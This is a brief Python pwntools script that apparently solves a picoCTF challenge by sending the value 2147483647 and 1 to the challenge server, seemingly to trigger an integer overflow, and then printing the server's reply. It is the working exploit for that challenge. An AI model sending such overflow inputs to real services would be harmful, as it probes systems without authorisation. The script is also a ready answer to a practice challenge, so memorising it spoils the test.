#!/usr/bin/env python3
from pwn import *

r = remote("saturn.picoctf.net", 49166)
r.recvuntil(":")
r.sendline("2147483647 1")

print(str(r.recvall()))
r.close()
